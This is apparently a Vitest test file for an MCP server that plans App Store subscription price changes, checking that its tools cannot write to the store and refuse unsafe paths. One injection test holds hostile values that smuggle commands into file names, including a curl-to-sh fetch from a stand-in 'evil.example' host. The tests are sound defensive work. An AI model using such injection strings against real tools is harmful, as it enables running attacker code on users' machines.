// pricingkit mcp: the MCP server's tools, their schemas and refusals, and
// the stdio transport. Agents can plan; humans apply: no tool writes to a
// store. The App Store client is mocked: nothing leaves the process.
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { linkSync, mkdirSync, readdirSync, readFileSync, symlinkSync, truncateSync, writeFileSync, existsSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
import { join } from 'node:path';
import { PassThrough } from 'node:stream';

const appleApiRequest = vi.fn();
vi.mock('@/lib/apple-connect/client', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@/lib/apple-connect/client')>();
  return { ...actual, appleApiRequest: (...args: unknown[]) => appleApiRequest(...args) };
});

import { FakeOfferStore } from '@/lib/adapters/__tests__/fake-apple-offer-store';
import { changeSetHash, parseChangeSet } from '@/lib/pricing';
import { internalErrorMessage, MAX_LINE_BYTES, MAX_TOOL_FILE_BYTES, McpServer, serveMcp, shellQuote, TOOLS } from '../mcp';
import { run as runCliCaptured, fakeAppleEnv, tempDir } from './fixtures';

const BUNDLE = 'com.example.app';
const A = '9900000001';
let store: FakeOfferStore;
let env: Record<string, string>;
let tmp: ReturnType<typeof tempDir>;
let server: McpServer;
let nextId = 0;

async function call(method: string, params: Record<string, unknown> = {}) {
  return (await server.handle({ jsonrpc: '2.0', id: ++nextId, method, params })) as { result?: Record<string, unknown>; error?: { code: number; message: string } };
}
async function tool(name: string, args: Record<string, unknown>) {
  const r = await call('tools/call', { name, arguments: args });
  return r.result as { content: Array<{ text: string }>; structuredContent?: { exitCode?: number; result?: unknown; command?: string; hash?: string; requiredFlags?: unknown }; isError?: boolean };
}
const writeJson = (name: string, value: unknown) => writeFileSync(join(tmp.dir, name), JSON.stringify(value));

beforeEach(async () => {
  store = new FakeOfferStore().addSubscription(A, 'ONE_YEAR', { USA: '49.99', GBR: '44.99' }, { USA: ['24.99', '27.99', '49.99', '54.99'], GBR: ['22.99', '24.99', '44.99', '49.99'] });
  store.seedPromo(A, 'example_annual_50', {}, { USA: '24.99', GBR: '22.99' });
  appleApiRequest.mockReset();
  appleApiRequest.mockImplementation(store.handle);
  env = await fakeAppleEnv();
  tmp = tempDir();
  server = new McpServer({ cwd: tmp.dir, env, now: () => new Date('2030-01-01T00:00:00Z') });
  writeJson('rules.json', {
    kind: 'pricingkit.offerRules',
    schemaVersion: 1,
    app: { bundleId: BUNDLE },
    offers: [{ product: { platform: 'apple', type: 'subscription', id: A }, kind: 'apple.promo', key: 'example_annual_50', pricing: { type: 'percentOfCurrent', percent: '50', snap: 'nearest' }, syncWithBase: true }],
  });
  writeJson('base.json', { kind: 'pricingkit.spec', schemaVersion: 1, app: { bundleId: BUNDLE }, products: [{ product: { platform: 'apple', type: 'subscription', id: A }, targets: { type: 'fixed', prices: { US: '54.99', GB: '49.99' } } }] });
});
afterEach(() => tmp.cleanup());

describe('MCP protocol', () => {
  it('initializes, answers ping and lists exactly the read and plan tools', async () => {
    const init = await call('initialize', { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 'test', version: '0' } });
    expect(init.result).toMatchObject({ protocolVersion: '2025-06-18', capabilities: { tools: {} }, serverInfo: { name: 'pricingkit' } });
    expect((await call('initialize', { protocolVersion: '1999-01-01' })).result!.protocolVersion).toBe('2025-06-18');
    expect(await server.handle({ jsonrpc: '2.0', method: 'notifications/initialized' })).toBeUndefined();
    expect((await call('ping')).result).toEqual({});
    expect((await call('nope')).error).toMatchObject({ code: -32601 });

    const list = (await call('tools/list')).result as { tools: Array<{ name: string; inputSchema: { type: string; additionalProperties: boolean; properties: Record<string, unknown>; required?: string[] } }> };
    expect(list.tools.map((t) => t.name)).toEqual(['offers', 'plan', 'diff', 'apply_command']);
    for (const t of list.tools) {
      expect(t.inputSchema).toMatchObject({ type: 'object', additionalProperties: false });
      for (const key of t.inputSchema.required ?? []) expect(t.inputSchema.properties).toHaveProperty(key);
    }
    // No tool can write: none maps to the CLI's apply, and none takes --confirm or force flags
    for (const t of TOOLS) {
      expect(t.name).not.toBe('apply');
      expect(Object.keys(t.inputSchema.properties)).not.toEqual(expect.arrayContaining(['confirm']));
      expect(Object.keys(t.inputSchema.properties).some((k) => /force|confirm|allow/i.test(k))).toBe(false);
    }
  });
});

describe('MCP tools', () => {
  it('offers runs the read-only command', async () => {
    const offers = await tool('offers', { bundleId: BUNDLE, subscription: A, kind: 'apple.promo' });
    expect(offers.structuredContent).toMatchObject({ exitCode: 0, result: { kind: 'pricingkit.offers' } });
    expect(store.writes()).toEqual([]);
  });

  it('plan writes a plan file, diff summarises it, apply_command returns the start of the command and applies nothing', async () => {
    const plan = await tool('plan', { spec: 'base.json', rules: 'rules.json', out: 'plans/plan.json' });
    // plans/ doesn't exist: the CLI reports it, nothing is written
    expect(plan.isError).toBe(true);
    const ok = await tool('plan', { spec: 'base.json', rules: 'rules.json', out: 'plan.json' });
    expect(ok.structuredContent!.exitCode).toBe(2);
    const changeSet = parseChangeSet(readFileSync(join(tmp.dir, 'plan.json'), 'utf8'));
    const hash = changeSetHash(changeSet);
    // No tool output carries the confirm hash: the person applying runs diff themselves
    expect((ok.structuredContent!.result as { hash?: string }).hash).toBeUndefined();
    expect(JSON.stringify(ok)).not.toContain(hash);

    const diff = await tool('diff', { plan: 'plan.json' });
    expect(diff.structuredContent).toMatchObject({ exitCode: 2, result: { byGroup: { basePrices: 2, offers: 1 } } });
    expect((diff.structuredContent!.result as { changeSetHash?: string }).changeSetHash).toBeUndefined();
    expect(JSON.stringify(diff)).not.toContain(hash);

    const before = appleApiRequest.mock.calls.length;
    const command = await tool('apply_command', { plan: 'plan.json' });
    // No hash and no opt-in flag: the person gets the hash from their own diff and adds the flag knowingly
    expect(command.structuredContent!.command).toBe('pricingkit apply plan.json');
    expect(JSON.stringify(command)).not.toContain(hash);
    expect(command.structuredContent).toMatchObject({ needsConfirm: true, requiredFlags: [{ flag: '--allow-base-prices', reason: expect.stringMatching(/changes base prices \(2 ops\)/) }] });
    expect(command.content[0].text).toMatch(/^pricingkit apply plan\.json --confirm <hash from pricingkit diff>/);
    expect(command.content[0].text).toMatch(/runs this command with --confirm <the hash that diff prints> and the flags below/);
    expect(command.content[0].text).toMatch(/PRICINGKIT_EXPECT_BUNDLE_ID/);
    expect(appleApiRequest.mock.calls.length).toBe(before);
    expect(store.writes()).toEqual([]);
    expect(readdirSync(tmp.dir).some((f) => f.endsWith('.run.json'))).toBe(false);

    // The command it returns works for the person who runs it
    const reviewed = await runCliCaptured(['diff', 'plan.json', '--json'], { cwd: tmp.dir });
    const confirm = JSON.parse(reviewed.stdout).changeSetHash;
    const applied = await runCliCaptured([...(command.structuredContent!.command as string).split(' ').slice(1), '--confirm', confirm, '--allow-base-prices'], { env, cwd: tmp.dir });
    expect(applied.code).toBe(0);
    expect(store.writes()).toHaveLength(3);
  });

  it('apply_command names --force-delete for deletes, and adds --resume when asked', async () => {
    const del = await runCliCaptured(['offer', 'delete', '--bundle-id', BUNDLE, '--subscription', A, '--kind', 'apple.promo', '--offer', 'example_annual_50', '--out', 'del.json'], { env, cwd: tmp.dir });
    expect(del.code).toBe(2);
    const hash = changeSetHash(parseChangeSet(readFileSync(join(tmp.dir, 'del.json'), 'utf8')));
    // No run log yet: resume must name an existing log of this plan
    expect((await tool('apply_command', { plan: 'del.json', resume: 'del.run.json' })).content[0].text).toMatch(/Can't read run log del\.run\.json \(ENOENT\)/);
    // A failed run (no --force-delete) leaves a log to resume
    expect((await runCliCaptured(['apply', 'del.json', '--confirm', hash], { env, cwd: tmp.dir })).code).toBe(1);
    const r = await tool('apply_command', { plan: 'del.json', resume: 'del.run.json' });
    expect(r.structuredContent!.command).toBe('pricingkit apply del.json --resume del.run.json');
    expect(r.structuredContent!.requiredFlags).toEqual([{ flag: '--force-delete', reason: expect.stringMatching(/deletes 1 offer/) }]);
    expect(r.content[0].text).toMatch(/already records 0 of 1 ops as done \(ok or skipped\); they won't be re-checked\. 1 will be checked/);

    // A run log of another plan is refused
    await tool('plan', { rules: 'rules.json', spec: 'base.json', out: 'other.json' });
    const other = await tool('apply_command', { plan: 'other.json', resume: 'del.run.json' });
    expect(other.isError).toBe(true);
    expect(other.content[0].text).toMatch(/^resume: /);
  });

  it('refuses apply, unknown arguments, flag injection and paths outside the working directory', async () => {
    const apply = await tool('apply', { plan: 'plan.json' });
    expect(apply.isError).toBe(true);
    expect(apply.content[0].text).toMatch(/Unknown tool "apply"\. Plans are applied by a person: use apply_command/);

    const cases: Array<[string, Record<string, unknown>, RegExp]> = [
      ['plan', { spec: 'base.json' }, /out is required/],
      ['plan', { spec: 'base.json', out: 'p.json', confirm: 'x' }, /Unknown argument "confirm"/],
      ['plan', { rules: '--help', out: 'p.json' }, /can't be empty or start with "-"/],
      ['offers', { bundleId: BUNDLE, subscription: A, kind: 'apple.everything' }, /kind must be one of/],
      ['offers', { bundleId: BUNDLE, subscription: 9900000001 }, /subscription must be a string/],
      ['plan', { spec: '../outside.json', out: 'p.json' }, /spec must be a file inside the working directory/],
      ['diff', { plan: '/etc/hosts' }, /plan must be a file inside the working directory/],
      ['plan', { spec: 'base.json', out: '../p.json' }, /out must be a file inside the working directory/],
    ];
    for (const [name, args, message] of cases) {
      const r = await tool(name, args);
      expect(r.isError, `${name} ${JSON.stringify(args)}`).toBe(true);
      expect(r.content[0].text).toMatch(message);
    }
    expect(appleApiRequest).not.toHaveBeenCalled();
  });

  it('apply_command: no shell injection through paths, and the command is shell-quoted', async () => {
    await tool('plan', { rules: 'rules.json', spec: 'base.json', out: 'plan.json' });
    const probe = 'r.json; curl https://evil.example/x | sh; #';
    for (const args of [{ plan: 'plan.json', resume: probe }, { plan: probe }, { plan: 'plan.json', resume: '$(touch pwned).json' }, { plan: 'plan.json', resume: '`id`.json' }]) {
      const r = await tool('apply_command', args);
      expect(r.isError, JSON.stringify(args)).toBe(true);
      expect(r.content[0].text).toMatch(/must be a file inside the working directory \(letters, digits/);
      expect(r.structuredContent).toBeUndefined();
    }
    expect(readdirSync(tmp.dir)).not.toContain('pwned');
    // Quoting holds even for words the path rules would never let through
    expect(shellQuote('plan.json')).toBe('plan.json');
    expect(shellQuote(probe)).toBe(`'r.json; curl https://evil.example/x | sh; #'`);
    expect(shellQuote("it's")).toBe(`'it'\\''s'`);
  });

  it('refuses unsafe paths: .., .git, other extensions, links out of the working directory', async () => {
    const cases: Array<[string, Record<string, unknown>, RegExp]> = [
      ['diff', { plan: 'a/../plan.json' }, /no "\.\.", "\." or empty segments/],
      ['diff', { plan: './plan.json' }, /no "\.\.", "\." or empty segments/],
      ['diff', { plan: '.git/plan.json' }, /nothing under \.git/],
      ['plan', { spec: 'base.json', out: '.git/hooks/pre-commit.json' }, /nothing under \.git/],
      ['plan', { spec: 'base.json', out: 'plan.sh' }, /\.json only/],
      ['plan', { spec: 'base.txt', out: 'p.json' }, /\.json, \.yaml, \.yml only/],
      ['plan', { spec: 'base.json', out: 'missing-folder/p.json' }, /its folder does not exist/],
    ];
    for (const [name, args, message] of cases) {
      const r = await tool(name, args);
      expect(r.isError, `${name} ${JSON.stringify(args)}`).toBe(true);
      expect(r.content[0].text).toMatch(message);
    }
    // Symlinks that lead outside are refused for reads and writes
    const outside = tempDir();
    try {
      writeFileSync(join(outside.dir, 'secret.json'), '{}');
      symlinkSync(join(outside.dir, 'secret.json'), join(tmp.dir, 'linked.json'));
      symlinkSync(outside.dir, join(tmp.dir, 'out-dir'));
      expect((await tool('diff', { plan: 'linked.json' })).content[0].text).toMatch(/resolves outside, through a link/);
      expect((await tool('plan', { spec: 'base.json', out: 'out-dir/p.json' })).content[0].text).toMatch(/folder resolves outside/);
      expect(readFileSync(join(outside.dir, 'secret.json'), 'utf8')).toBe('{}');
    } finally {
      outside.cleanup();
    }
    expect(appleApiRequest).not.toHaveBeenCalled();
  });

  it('plan never replaces a file that is not a plan (or state) file', async () => {
    writeFileSync(join(tmp.dir, 'notes.json'), '{"keep": true}');
    const r = await tool('plan', { spec: 'base.json', out: 'notes.json' });
    expect(r.isError).toBe(true);
    expect(r.content[0].text).toMatch(/exists and is not a plan file; it won't be replaced/);
    expect(readFileSync(join(tmp.dir, 'notes.json'), 'utf8')).toBe('{"keep": true}');
    expect((await tool('plan', { spec: 'base.json', out: 'p.json', stateOut: 'notes.json' })).content[0].text).toMatch(/not a state file/);
    mkdirSync(join(tmp.dir, 'dir.json'));
    expect((await tool('plan', { spec: 'base.json', out: 'dir.json' })).content[0].text).toMatch(/not a plain file/);
    // A plan file may be replaced by a new plan, a state file by a new state
    expect((await tool('plan', { spec: 'base.json', out: 'p.json', stateOut: 's.json' })).structuredContent!.exitCode).toBe(2);
    expect((await tool('plan', { spec: 'base.json', out: 'p.json', stateOut: 's.json' })).structuredContent!.exitCode).toBe(2);
  });

  it('refuses prototype keys as arguments, and echoes only valid JSON-RPC ids', async () => {
    for (const key of ['__proto__', 'constructor', 'toString', 'hasOwnProperty']) {
      const r = await call('tools/call', { name: 'diff', arguments: JSON.parse(`{"plan":"plan.json","${key}":"x"}`) });
      expect((r.result as { content: Array<{ text: string }> }).content[0].text).toMatch(new RegExp(`Unknown argument "${key}"`));
    }
    expect(await server.handle({ jsonrpc: '2.0', id: 'a', method: 'ping' })).toEqual({ jsonrpc: '2.0', id: 'a', result: {} });
    expect(await server.handle({ jsonrpc: '2.0', id: { evil: true }, method: 'ping' })).toEqual({ jsonrpc: '2.0', id: null, error: { code: -32600, message: 'Invalid request' } });
    expect(await server.handle({ jsonrpc: '2.0', id: [1], method: 'ping' })).toMatchObject({ id: null, error: { code: -32600 } });
    expect(await server.handle({ jsonrpc: '2.0', id: null, method: 'ping' })).toBeUndefined();
  });

  it('reports CLI errors as tool errors, redacted, with the exit code', async () => {
    const r = await tool('diff', { plan: 'missing.json' });
    expect(r.isError).toBe(true);
    expect(r.structuredContent).toMatchObject({ exitCode: 1, result: { error: { message: expect.stringMatching(/missing\.json/) } } });
    expect(JSON.stringify(r)).not.toContain(env.ASC_PRIVATE_KEY.split('\n')[1]);
  });
});

describe('MCP notifications and output files', () => {
  it('refuses a plan sent as a notification (no answer would say it wrote a file); read-only tools still run', async () => {
    const logged: string[] = [];
    server = new McpServer({ cwd: tmp.dir, env, log: (t) => logged.push(t) });
    const params = { name: 'plan', arguments: { spec: 'base.json', out: 'silent.json' } };
    expect(await server.handle({ jsonrpc: '2.0', method: 'tools/call', params })).toBeUndefined();
    expect(await server.handle({ jsonrpc: '2.0', id: null, method: 'tools/call', params })).toEqual({
      jsonrpc: '2.0',
      id: null,
      error: { code: -32600, message: 'plan writes files: send it as a request with a string or number id' },
    });
    expect(existsSync(join(tmp.dir, 'silent.json'))).toBe(false);
    expect(logged.join('')).toMatch(/refused a plan call sent as a notification/);
    expect(appleApiRequest).not.toHaveBeenCalled();
    // A read-only tool sent as a notification runs; nothing is answered
    expect(await server.handle({ jsonrpc: '2.0', method: 'tools/call', params: { name: 'offers', arguments: { bundleId: BUNDLE, subscription: A } } })).toBeUndefined();
    expect(appleApiRequest).toHaveBeenCalled();
  });

  it('plan output: never written through a hard link; a plan file is replaced atomically', async () => {
    expect((await tool('plan', { spec: 'base.json', out: 'p.json' })).structuredContent!.exitCode).toBe(2);
    const first = readFileSync(join(tmp.dir, 'p.json'), 'utf8');
    linkSync(join(tmp.dir, 'p.json'), join(tmp.dir, 'hard.json'));
    const r = await tool('plan', { spec: 'base.json', out: 'hard.json' });
    expect(r.isError).toBe(true);
    expect(JSON.stringify(r.structuredContent)).toMatch(/2 hard links; it won't be replaced/);
    expect(readFileSync(join(tmp.dir, 'p.json'), 'utf8')).toBe(first);
    // No temporary files are left behind
    expect(readdirSync(tmp.dir).filter((f) => f.endsWith('.tmp'))).toEqual([]);
  });
});

describe('MCP stdio transport', () => {
  it('decodes UTF-8 across chunk boundaries (a multibyte character split in two)', async () => {
    const input = new PassThrough();
    const out: string[] = [];
    const done = serveMcp({ cwd: tmp.dir, env, input, output: (line) => out.push(line) });
    const bytes = Buffer.from(`${JSON.stringify({ jsonrpc: '2.0', id: 'naïve-€-😀', method: 'ping' })}\n`, 'utf8');
    const euro = bytes.indexOf(Buffer.from('€', 'utf8'));
    const emoji = bytes.indexOf(Buffer.from('😀', 'utf8'));
    // Split inside the 3-byte euro sign and inside the 4-byte emoji
    input.write(bytes.subarray(0, euro + 1));
    input.write(bytes.subarray(euro + 1, emoji + 2));
    input.write(bytes.subarray(emoji + 2));
    input.end();
    await done;
    expect(out.map((l) => JSON.parse(l))).toEqual([{ jsonrpc: '2.0', id: 'naïve-€-😀', result: {} }]);
  });


  it('reads newline-delimited JSON-RPC and writes one response per request, protocol only', async () => {
    const input = new PassThrough();
    const out: string[] = [];
    const done = serveMcp({ cwd: tmp.dir, env, input, output: (line) => out.push(line) });
    input.write(`${JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-03-26' } })}\n`);
    input.write(`${JSON.stringify({ jsonrpc: '2.0', method: 'notifications/initialized' })}\n`);
    input.write('not json\n');
    input.write(`${JSON.stringify({ jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: 'diff', arguments: { plan: 'nope.json' } } })}\n`);
    input.end();
    await done;
    const messages = out.map((l) => JSON.parse(l));
    expect(messages).toHaveLength(3);
    // Requests are answered as they finish; match by id
    expect(messages.find((m) => m.id === 1)).toMatchObject({ result: { protocolVersion: '2025-03-26' } });
    expect(messages.find((m) => m.id === null)).toMatchObject({ error: { code: -32700 } });
    expect(messages.find((m) => m.id === 2)).toMatchObject({ result: { isError: true } });
  });

  it('caps line length, and stops quietly when the output fails (EPIPE)', async () => {
    const input = new PassThrough();
    const out: string[] = [];
    const done = serveMcp({ cwd: tmp.dir, env, input, output: (line) => out.push(line) });
    input.write('{"jsonrpc":"2.0","id":1,"method":"ping","x":"');
    input.write('a'.repeat(MAX_LINE_BYTES));
    input.write('"}\n');
    input.write(`${JSON.stringify({ jsonrpc: '2.0', id: 2, method: 'ping' })}\n`);
    input.end();
    await done;
    expect(out.map((l) => JSON.parse(l))).toEqual([
      { jsonrpc: '2.0', id: null, error: { code: -32600, message: `Request longer than ${MAX_LINE_BYTES} bytes` } },
      { jsonrpc: '2.0', id: 2, result: {} },
    ]);

    const broken = new PassThrough();
    const logged: string[] = [];
    const stopped = serveMcp({
      cwd: tmp.dir,
      env,
      input: broken,
      log: (t) => logged.push(t),
      output: () => {
        throw Object.assign(new Error('write EPIPE'), { code: 'EPIPE' });
      },
    });
    broken.write(`${JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'ping' })}\n`);
    broken.end();
    await expect(stopped).resolves.toBeUndefined();
    expect(logged.join('')).toMatch(/output closed \(EPIPE\)/);
  });
});

describe('the write boundary', () => {
  it('only the apply command calls the executor; the MCP server never names it (apply argv is refused at run time too)', () => {
    const cliDir = join(__dirname, '..');
    const sources = (dir: string): string[] =>
      readdirSync(dir, { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? (e.name === '__tests__' ? [] : sources(join(dir, e.name))) : e.name.endsWith('.ts') ? [join(dir, e.name)] : []));
    const callers = sources(cliDir).filter((f) => /applyChangeSet\(|\.applyOffer\(|\.applyMany\(|adapter\.apply\(/.test(readFileSync(f, 'utf8')));
    expect(callers.map((f) => f.slice(cliDir.length + 1))).toEqual(['commands/apply.ts']);
    const mcp = readFileSync(join(cliDir, 'mcp.ts'), 'utf8');
    expect(mcp).not.toMatch(/commands\/apply'|applyCommand\b|applyChangeSet/);
  });
});

describe('MCP file safety', () => {
  it.skipIf(process.platform === 'win32')('refuses a FIFO instead of blocking on it, in the server and in the CLI', async () => {
    execFileSync('mkfifo', [join(tmp.dir, 'fifo.json')]);
    const r = await tool('diff', { plan: 'fifo.json' });
    expect(r.isError).toBe(true);
    expect(r.content[0].text).toMatch(/plan: fifo\.json is not a regular file/);
    const cli = await runCliCaptured(['diff', 'fifo.json'], { cwd: tmp.dir });
    expect(cli.code).toBe(1);
    expect(cli.stderr).toMatch(/not a regular file/);
  });

  it('refuses a file larger than the cap before reading it', async () => {
    writeFileSync(join(tmp.dir, 'huge.json'), '');
    truncateSync(join(tmp.dir, 'huge.json'), MAX_TOOL_FILE_BYTES + 1);
    const r = await tool('diff', { plan: 'huge.json' });
    expect(r.content[0].text).toMatch(/larger than 16 MB/);
  });

  it('never writes into dot-folders or dot-files', async () => {
    mkdirSync(join(tmp.dir, '.github'));
    for (const out of ['.github/plan.json', '.plan.json']) {
      const r = await tool('plan', { spec: 'base.json', out });
      expect(r.isError, out).toBe(true);
      expect(r.content[0].text).toMatch(/starting with "\."/);
    }
    mkdirSync(join(tmp.dir, 'plans'));
    symlinkSync(join(tmp.dir, '.github'), join(tmp.dir, 'plans', 'ci'));
    expect((await tool('plan', { spec: 'base.json', out: 'plans/ci/plan.json' })).content[0].text).toMatch(/starting with "\."/);
    expect(readdirSync(join(tmp.dir, '.github'))).toEqual([]);
    expect(appleApiRequest).not.toHaveBeenCalled();
  });

  it('quotes a leading "=" (zsh expands =cmd to a path)', () => {
    expect(shellQuote('=ls')).toBe("'=ls'");
    expect(shellQuote('a=b')).toBe('a=b');
  });

  it('scrubs credentials from internal error messages', () => {
    const message = internalErrorMessage(new Error(`failed with ${env.ASC_PRIVATE_KEY} and key ${env.ASC_KEY_ID}`), env);
    expect(message).not.toContain(env.ASC_KEY_ID);
    expect(message).not.toContain(env.ASC_PRIVATE_KEY.split('\n')[1]);
    expect(message.length).toBeLessThanOrEqual(303);
  });
});

